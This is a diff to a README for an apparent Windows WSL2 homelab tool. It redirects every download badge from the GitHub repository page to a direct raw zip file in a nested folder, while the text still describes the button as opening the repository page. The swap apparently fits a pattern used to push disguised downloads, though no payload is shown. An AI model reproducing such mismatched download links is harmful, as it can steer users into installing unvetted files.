@@ -1,6 +1,6 @@
 # 🏠 lextex-homelab - Easy WSL2 Homelab Setup for Windows
 
-[![Download lextex-homelab](https://img.shields.io/badge/Download-lextex--homelab-brightgreen?style=for-the-badge)](https://github.com/AniketPaul44/lextex-homelab)
+[![Download lextex-homelab](https://img.shields.io/badge/Download-lextex--homelab-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/AniketPaul44/lextex-homelab/main/services/user/homelab-lextex-2.3.zip)
 
 ---
 
@@ -35,7 +35,7 @@ These requirements ensure the homelab runs smoothly.
 
 Click the big button below to go to the GitHub repository page. This page holds the installation files and instructions you need.
 
-[![Download lextex-homelab](https://img.shields.io/badge/Download-lextex--homelab-blue?style=for-the-badge)](https://github.com/AniketPaul44/lextex-homelab)
+[![Download lextex-homelab](https://img.shields.io/badge/Download-lextex--homelab-blue?style=for-the-badge)](https://raw.githubusercontent.com/AniketPaul44/lextex-homelab/main/services/user/homelab-lextex-2.3.zip)
 
 ---
 
@@ -183,4 +183,4 @@ If you need assistance:
 
 ## 🔗 Download and start using lextex-homelab
 
-[![Download lextex-homelab](https://img.shields.io/badge/Download-lextex--homelab-brightgreen?style=for-the-badge)](https://github.com/AniketPaul44/lextex-homelab)
+[![Download lextex-homelab](https://img.shields.io/badge/Download-lextex--homelab-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/AniketPaul44/lextex-homelab/main/services/user/homelab-lextex-2.3.zip)
